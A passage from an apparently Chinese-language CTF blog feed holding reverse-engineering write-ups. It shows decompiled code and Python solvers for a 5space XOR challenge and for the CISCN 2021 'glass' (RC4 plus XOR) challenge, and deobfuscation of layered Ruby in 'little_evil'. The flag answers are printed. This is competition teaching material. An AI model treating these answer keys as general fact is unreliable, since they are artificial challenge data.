v96 = <span class="hljs-number">1</span>;</span><br><span class="line">LABEL_210:</span><br><span class="line">      *(v90 - <span class="hljs-number">2</span>) = v96;</span><br><span class="line">      *(v90 - <span class="hljs-number">39</span>) = v96;</span><br><span class="line">    }</span><br><span class="line">    v4 = v90[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>;</span><br><span class="line">    *v90 = <span class="hljs-number">0</span>;</span><br><span class="line">    *(v90 - <span class="hljs-number">1</span>) = <span class="hljs-number">32</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v4 )</span><br><span class="line">      v90[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    v97 = <span class="hljs-number">32</span>;</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !v96 )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">do</span></span><br><span class="line">          --v97;</span><br><span class="line">        <span class="hljs-keyword">while</span> ( v97 );</span><br><span class="line">        *v90 = <span class="hljs-number">1</span>;</span><br><span class="line">        *(v90 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">        *(v90 - <span class="hljs-number">2</span>) = <span class="hljs-number">1</span>;</span><br><span class="line">        *v90 = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_170;</span><br><span class="line">      }</span><br><span class="line">      *(v90 - <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      v90[<span class="hljs-number">1</span>] = v96;</span><br><span class="line">      *(v90 - <span class="hljs-number">2</span>) = v96--;</span><br><span class="line">      v90[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      *(v90 - <span class="hljs-number">2</span>) = v96;</span><br><span class="line">      --v97;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v97 );</span><br><span class="line">    *v90 = <span class="hljs-number">0</span>;</span><br><span class="line">    *(v90 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v96 )</span><br><span class="line">      *(v90 - <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    v98 = *(v90 - <span class="hljs-number">38</span>);</span><br><span class="line">    v99 = *(v90 - <span class="hljs-number">2</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v98 )</span><br><span class="line">    {</span><br><span class="line">      v99 += v98;</span><br><span class="line">      *(v90 - <span class="hljs-number">2</span>) = v99;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v99 )</span><br><span class="line">    {</span><br><span class="line">      *(v90 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-built_in">putc</span>(<span class="hljs-string">'C'</span>, _bss_start);</span><br><span class="line">      <span class="hljs-built_in">putc</span>(<span class="hljs-string">'o'</span>, _bss_start);</span><br><span class="line">      <span class="hljs-built_in">putc</span>(<span class="hljs-string">'n'</span>, _bss_start);</span><br><span class="line">      <span class="hljs-built_in">putc</span>(<span class="hljs-string">'g'</span>, _bss_start);</span><br><span class="line">      <span class="hljs-built_in">putc</span>(<span class="hljs-string">'r'</span>, _bss_start);</span><br><span class="line">      <span class="hljs-built_in">putc</span>(<span class="hljs-string">'a'</span>, _bss_start);</span><br><span class="line">      <span class="hljs-built_in">putc</span>(<span class="hljs-string">'t'</span>, _bss_start);</span><br><span class="line">      <span class="hljs-built_in">putc</span>(<span class="hljs-string">'s'</span>, _bss_start);</span><br><span class="line">      v100 = _bss_start;</span><br><span class="line">      *(_WORD *)v90 = <span class="hljs-number">33</span>;</span><br><span class="line">      <span class="hljs-built_in">putc</span>(<span class="hljs-string">'!'</span>, v100);</span><br><span class="line">      *(v90 - <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      *(v90 - <span class="hljs-number">1</span>) = <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">do</span></span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-built_in">putc</span>(<span class="hljs-string">'n'</span>, _bss_start);</span><br><span class="line">        <span class="hljs-built_in">putc</span>(<span class="hljs-string">'o'</span>, _bss_start);</span><br><span class="line">        <span class="hljs-built_in">putc</span>(<span class="hljs-string">'n'</span>, _bss_start);</span><br><span class="line">        <span class="hljs-built_in">putc</span>(<span class="hljs-string">'o'</span>, _bss_start);</span><br><span class="line">        <span class="hljs-built_in">putc</span>(<span class="hljs-string">'n'</span>, _bss_start);</span><br><span class="line">        *(_WORD *)v90 = <span class="hljs-string">'o'</span>;</span><br><span class="line">        <span class="hljs-built_in">putc</span>(<span class="hljs-string">'o'</span>, _bss_start);</span><br><span class="line">        v4 = (*(v90 - <span class="hljs-number">1</span>))-- == <span class="hljs-number">1</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">while</span> ( !v4 );</span><br><span class="line">    }</span><br><span class="line">    v4 = (*(v90 - <span class="hljs-number">35</span>))-- == <span class="hljs-number">1</span>;</span><br><span class="line">    v62 = v90 - <span class="hljs-number">35</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="hljs-keyword">continue</span>;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>虽然还有较多的无用代码，但是已经可以看到程序的大致流程，输入之后判断是否为<code>flag{***}</code>格式，然后进行正确性检验，和已知数据进行对比，正确输出<code>Congrats!</code>，错误输出<code>nonono</code>。</p><h4 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><p>通过调试其实可以发现程序的主要执行逻辑就是与后一位异或，代码中的体现就是两数不停除2，找到每一位的数为1或是0，如两数第n位相同则结果不变，体现到二进制上就是最终结果的第n位为0，不同则结果加<code>2^n</code>，体现到二进制上就是最终结果的第n位为1</p><p>知道算法是异或之后很容易解出来flag</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">target = [<span class="hljs-number">0x53</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x09</span>,</span><br><span class="line">          <span class="hljs-number">0x00</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x34</span>]</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(target)-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):</span><br><span class="line">    target[i-<span class="hljs-number">1</span>] ^= target[i]</span><br><span class="line"></span><br><span class="line">flag = <span class="hljs-string">'flag{'</span>+<span class="hljs-string">""</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> target])+<span class="hljs-string">'}'</span></span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"><span class="hljs-comment"># flag{d78b6f30225cdc811adfe8d4e7c9fd34}</span></span><br></pre></td></tr></tbody></table></figure><h3 id="babyruby"><a href="#babyruby" class="headerlink" title="babyruby"></a>babyruby</h3><blockquote><p>当时硬逆了很久mruby的字节码，只有AAA唯一解，有时间复现一下</p></blockquote><h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h2><h3 id="capp"><a href="#capp" class="headerlink" title="capp"></a>capp</h3><blockquote><p>抽空复现</p></blockquote><h3 id="uniapp"><a href="#uniapp" class="headerlink" title="uniapp"></a>uniapp</h3><blockquote><p>抽空复现</p></blockquote></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> 5space </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 ciscn Re部分wp</title>
      <link href="/2021/05/16/2021-05-16-2021_ciscn_Re%E9%83%A8%E5%88%86wp/"/>
      <url>/2021/05/16/2021-05-16-2021_ciscn_Re%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>2021 ciscn Re部分wp</p><span id="more"></span><h2 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h2><p>java层没什么多余的调用，直接native调用checkflag</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> __fastcall <span class="hljs-title">Java_com_ciscn_glass_MainActivity_checkFlag</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">int</span> a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line"><span class="hljs-keyword">char</span> *v3; <span class="hljs-comment">// r4</span></span><br><span class="line"><span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// r5</span></span><br><span class="line"><span class="hljs-keyword">char</span> v6[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [sp+0h] [bp-220h] BYREF</span></span><br><span class="line"><span class="hljs-keyword">char</span> v7[<span class="hljs-number">260</span>]; <span class="hljs-comment">// [sp+100h] [bp-120h] BYREF</span></span><br><span class="line">v3 = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">sub_F0C</span>(a1, a3);</span><br><span class="line"><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(v3) != <span class="hljs-number">39</span> )</span><br><span class="line"><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line"><span class="hljs-built_in">memset</span>(v7, <span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>u);</span><br><span class="line"><span class="hljs-built_in">qmemcpy</span>(v6, <span class="hljs-string">"12345678"</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(v6));</span><br><span class="line">v4 = <span class="hljs-built_in">strlen</span>(v6);</span><br><span class="line"><span class="hljs-built_in">sub_FFC</span>((<span class="hljs-keyword">int</span>)v7, (<span class="hljs-keyword">int</span>)v6, v4);</span><br><span class="line"><span class="hljs-built_in">sub_1088</span>((<span class="hljs-keyword">int</span>)v7, v3, <span class="hljs-number">39</span>);</span><br><span class="line"><span class="hljs-built_in">sub_10D4</span>((<span class="hljs-keyword">int</span>)v3, <span class="hljs-number">39</span>, (<span class="hljs-keyword">int</span>)v6, v4);</span><br><span class="line"><span class="hljs-keyword">return</span> <span class="hljs-built_in">memcmp</span>(v3, &amp;unk_497C, <span class="hljs-number">0x27</span>u) == <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>长度检查，密钥拷贝，进行三步操作之后和已知结果比较，前两个显然是进行rc4加密，最后一个函数三个一组，相互异或，最后再逐位和密钥异或，逆运算即可</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">target = [<span class="hljs-number">0xA3</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x36</span>,</span><br><span class="line"><span class="hljs-number">0x4F</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x3F</span>]</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sub_10D4</span>(<span class="hljs-params">ss,&nbsp; a2,&nbsp; a3,&nbsp; a4</span>):</span></span><br><span class="line">result = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ss:</span><br><span class="line">result.append(i)</span><br><span class="line"><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(a2):</span><br><span class="line">result[j] ^= a3[j % a4]</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, a2, <span class="hljs-number">3</span>):</span><br><span class="line">result[i+<span class="hljs-number">1</span>] ^= result[i]</span><br><span class="line">result[i+<span class="hljs-number">2</span>] ^= result[i+<span class="hljs-number">1</span>]</span><br><span class="line">result[i] ^= result[i+<span class="hljs-number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Rc4_init</span>(<span class="hljs-params">S, K</span>):</span></span><br><span class="line">j = <span class="hljs-number">0</span></span><br><span class="line">k = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):</span><br><span class="line">S.append(i)</span><br><span class="line">k.append(K[i % <span class="hljs-built_in">len</span>(K)])</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):</span><br><span class="line">j = (j + S[i] + <span class="hljs-built_in">ord</span>(k[i])) % <span class="hljs-number">256</span></span><br><span class="line">S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_Decrypt</span>(<span class="hljs-params">S, D</span>):</span></span><br><span class="line">i = j = <span class="hljs-number">0</span></span><br><span class="line">result = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> D:</span><br><span class="line">i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span></span><br><span class="line">j = (j + S[i]) % <span class="hljs-number">256</span></span><br><span class="line">S[i], S[j] = S[j], S[i]</span><br><span class="line">t = (S[i] + S[j]) % <span class="hljs-number">256</span></span><br><span class="line">k = <span class="hljs-built_in">chr</span>(a ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])</span><br><span class="line">result += k</span><br><span class="line"><span class="hljs-keyword">return</span> result</span><br><span class="line"></span><br><span class="line">key = <span class="hljs-string">'12345678'</span></span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line">Rc4_init(s, key)</span><br><span class="line">k0 = [<span class="hljs-number">49</span>, <span class="hljs-number">50</span>, <span class="hljs-number">51</span>, <span class="hljs-number">52</span>, <span class="hljs-number">53</span>, <span class="hljs-number">54</span>, <span class="hljs-number">55</span>, <span class="hljs-number">56</span>]</span><br><span class="line">c = sub_10D4(target, <span class="hljs-number">39</span>, k0, <span class="hljs-number">8</span>)</span><br><span class="line"><span class="hljs-built_in">print</span>(c)</span><br><span class="line">z = rc4_Decrypt(s, c)</span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">"Decrypt:"</span>+z)</span><br><span class="line"><span class="hljs-comment"># CISCN{6654d84617f627c88846c172e0f4d46c}</span></span><br></pre></td></tr></tbody></table></figure><h2 id="little-evil"><a href="#little-evil" class="headerlink" title="little_evil"></a>little_evil</h2><p>程序本身解压squashfs，得到里面ruby环境和需要执行的rb代码，binwalk跑一下解压出来，得到一个混淆过后的ruby代码</p><figure class="highlight ruby hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-variable">$l1Il</span>=<span class="hljs-string">""</span>;<span class="hljs-variable">$l1lI</span>=<span class="hljs-string">""</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">llIl</span><span class="hljs-params">()</span></span><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span><span class="hljs-params">|7;<span class="hljs-keyword">end</span>;def l1lll()$lI1lll=10;<span class="hljs-keyword">end</span>;def llI1l()$lI1lll=$lI1lll|</span><span class="hljs-number">4</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lIlI</span><span class="hljs-params">()</span></span><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span>+<span class="hljs-number">3</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l111</span><span class="hljs-params">()</span></span><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span>%<span class="hljs-number">3</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lI1IlI</span><span class="hljs-params">()</span></span><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span><span class="hljs-params">|3;<span class="hljs-keyword">end</span>;def ll1l1()$lI1lll=$lI1lll*8;<span class="hljs-keyword">end</span>;def l1lI()$lI1lll=$lI1lll-3;<span class="hljs-keyword">end</span>;def lI1lII()$lI1lll=$lI1lll%1;<span class="hljs-keyword">end</span>;def lIlIl()$lI1lll=$lI1lll&amp;10;<span class="hljs-keyword">end</span>;def lIll()$lI1lll=$lI1lll-4;<span class="hljs-keyword">end</span>;def lII1()$lI1lll=$lI1lll%2;<span class="hljs-keyword">end</span>;def l1III()$lI1lll=$lI1lll|</span><span class="hljs-number">1</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1l111</span><span class="hljs-params">()</span></span><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span><span class="hljs-params">|5;<span class="hljs-keyword">end</span>;def l1IIII()$lI1lll=$lI1lll%10;<span class="hljs-keyword">end</span>;def l11I()$l1Il=$l1Il+$lI1lll.chr;<span class="hljs-keyword">end</span>;def lIlll()$lI1lll=$lI1lll*9;<span class="hljs-keyword">end</span>;def l11IlI()$lI1lll=$lI1lll-8;<span class="hljs-keyword">end</span>;def lI1I1()$lI1lll=$lI1lll+5;<span class="hljs-keyword">end</span>;def ll11lI()$lI1lll=$lI1lll&amp;9;<span class="hljs-keyword">end</span>;def lII1l1()send($l1Il[0,4], $l1Il[4,$l1Il.length]);<span class="hljs-keyword">end</span>;l1lll;lIlI;ll1l1;l1lI;l11I;l1lll;llI1l;lIlll;l11IlI;l11I;l1lll;lIlll;llI1l;lIlI;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llI1l;l1IIII;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI...</span></span><br></pre></td></tr></tbody></table></figure><p>发现进行了许多赋值和字符串拼接，没有输入输出等操作，因此将send改为puts输出最终结果，可以看到使用eval执行了另一段代码</p><figure class="highlight ruby hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-variable">$llll</span>=<span class="hljs-string">""</span>;</span><br><span class="line"><span class="hljs-variable">$llII</span>=<span class="hljs-string">""</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span>&nbsp;<span class="hljs-title">l1llI</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span><span class="hljs-params">|7;</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">def&nbsp;ll1III()</span></span><br><span class="line"><span class="hljs-params">$l1lI1l=$l1lI1l%7;</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">def&nbsp;lllI()</span></span><br><span class="line"><span class="hljs-params">$l1lI1l=$l1lI1l/4;</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">def&nbsp;lIl1l()</span></span><br><span class="line"><span class="hljs-params">$l1lI1l=$l1lI1l-3;</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">def&nbsp;l1lll()</span></span><br><span class="line"><span class="hljs-params">$l1lI1l=$l1lI1l|</span><span class="hljs-number">10</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span>&nbsp;<span class="hljs-title">l11I1I</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-number">10</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span>&nbsp;<span class="hljs-title">l1l1</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>&amp;<span class="hljs-number">7</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span>&nbsp;<span class="hljs-title">l1II</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>%<span class="hljs-number">8</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span>&nbsp;<span class="hljs-title">ll1I</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span><span class="hljs-params">|8;</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">def&nbsp;ll11()</span></span><br><span class="line"><span class="hljs-params">$l1lI1l=$l1lI1l^6;</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">def&nbsp;ll1l1I()</span></span><br><span class="line"><span class="hljs-params">$l1lI1l=$l1lI1l|</span><span class="hljs-number">1</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span>&nbsp;<span class="hljs-title">lI1Il</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span><span class="hljs-params">|3;</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">def&nbsp;llI1I()</span></span><br><span class="line"><span class="hljs-params">$l1lI1l=$l1lI1l+6;</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">def&nbsp;llIl1()</span></span><br><span class="line"><span class="hljs-params">$l1lI1l=$l1lI1l*4;</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">def&nbsp;lI1ll()</span></span><br><span class="line"><span class="hljs-params">$l1lI1l=$l1lI1l*5;</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">def&nbsp;l1111()</span></span><br><span class="line"><span class="hljs-params">$l1lI1l=$l1lI1l^7;</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">def&nbsp;l1lII()</span></span><br><span class="line"><span class="hljs-params">$l1lI1l=$l1lI1l^4;</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">def&nbsp;lIIl()</span></span><br><span class="line"><span class="hljs-params">$l1lI1l=$l1lI1l%5;</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">def&nbsp;lII11()</span></span><br><span class="line"><span class="hljs-params">$l1lI1l=$l1lI1l+9;</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">def&nbsp;lI11I()</span></span><br><span class="line"><span class="hljs-params">$llll=$llll+$l1lI1l.chr;</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">def&nbsp;l1IlI()</span></span><br><span class="line"><span class="hljs-params">puts($llll[0,4],&nbsp;$llll[4,$llll.length]);</span></span><br><span class="line"><span class="hljs-params"><span class="hljs-keyword">end</span>;</span></span><br><span class="line"><span class="hljs-params">l11I1I;lII11;lI1ll;llI1I;lI11I;...</span></span><br></pre></td></tr></tbody></table></figure><p>同样的方法改成puts之后输出</p><figure class="highlight ruby hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span 